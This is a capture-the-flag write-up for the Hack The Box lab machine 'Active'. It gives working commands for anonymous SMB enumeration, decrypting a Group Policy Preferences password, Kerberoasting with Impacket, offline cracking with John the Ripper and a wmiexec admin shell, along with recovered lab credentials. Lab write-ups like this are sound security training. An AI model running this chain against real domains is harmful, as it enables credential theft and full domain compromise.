# Active - Hack The Box Writeup

## Summary

Active is an Active Directory machine that demonstrates the dangers of Group Policy Preferences (GPP) password storage and Kerberoasting. Initial access was obtained by enumerating SMB shares and recovering a service account password from a GPP XML file. The service account was then used to perform Kerberoasting against a privileged account, resulting in domain administrator credentials and full compromise of the domain controller.

---

## Enumeration

### Nmap Scan

An initial Nmap scan was performed to identify exposed services.

```bash
nmap -sC -sV -Pn 10.129.20.121
```

Results:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
49152-49158/tcp open msrpc
```

The presence of Kerberos, LDAP, SMB, and DNS strongly indicated that the target was an Active Directory Domain Controller.

Domain identified:

```text
active.htb
```

---

## SMB Enumeration

Anonymous SMB enumeration was performed.

```bash
smbmap -H 10.129.20.121
```

A share named **Replication** was accessible without authentication.

```text
Replication
```

Connecting to the share:

```bash
smbclient //10.129.20.121/Replication -N
```

Recursive enumeration revealed the following file:

```text
Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

Contents:

```xml
<User name="active.htb\SVC_TGS">
<Properties
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
userName="active.htb\SVC_TGS"/>
</User>
```

---

## Recovering the Service Account Password

The Groups.xml file contained a GPP `cpassword` value.

Microsoft historically used a publicly known AES key to encrypt GPP passwords, making recovery trivial.

The password was decrypted using:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

Recovered credentials:

```text
Username: SVC_TGS
Password: GPPstillStandingStrong2k18
```

---

## Kerberoasting

Using the recovered credentials, a Kerberos Ticket Granting Ticket (TGT) was requested.

```bash
python3 /opt/impacket/examples/getTGT.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.20.121
```

The generated ticket cache was loaded:

```bash
export KRB5CCNAME=SVC_TGS.ccache
```

Service Principal Names (SPNs) were then enumerated and requested.

```bash
python3 /opt/impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.20.121 -request
```

This produced a Kerberos service ticket hash suitable for offline cracking.

---

## Cracking the Service Ticket

The extracted TGS hash was saved to a file and cracked with John the Ripper.

```bash
sudo john --format=krb5tgs \
--wordlist=/usr/share/wordlists/rockyou.txt \
--fork=4 TGS.txt
```

Recovered credentials:

```text
Username: Administrator
Password: Ticketmaster1968
```

---

## Privilege Escalation

The recovered domain administrator credentials provided direct administrative access to the Domain Controller.

Using Impacket WMIExec:

```bash
impacket-wmiexec active.htb/Administrator:'Ticketmaster1968'@10.129.20.121
```

A privileged shell was obtained.

---

## Proof of Compromise

### User Flag

Successfully retrieved.

### Root Flag

Successfully retrieved.

---

## Attack Path

1. Enumerated SMB shares anonymously.
2. Accessed the Replication share.
3. Discovered a GPP Groups.xml file containing a cpassword value.
4. Decrypted the cpassword to recover service account credentials.
5. Authenticated as SVC_TGS.
6. Performed Kerberoasting against a privileged account.
7. Cracked the Kerberos service ticket offline.
8. Recovered Administrator credentials.
9. Logged into the Domain Controller.
10. Retrieved both flags.

---

## Key Lessons Learned

* Group Policy Preferences passwords should never be considered secure.
* Misconfigured SMB shares can expose sensitive domain information.
* Service accounts with SPNs are excellent Kerberoasting targets.
* Weak service account passwords can lead directly to domain compromise.
* Kerberos tickets can often be attacked offline without generating additional authentication attempts against the target.
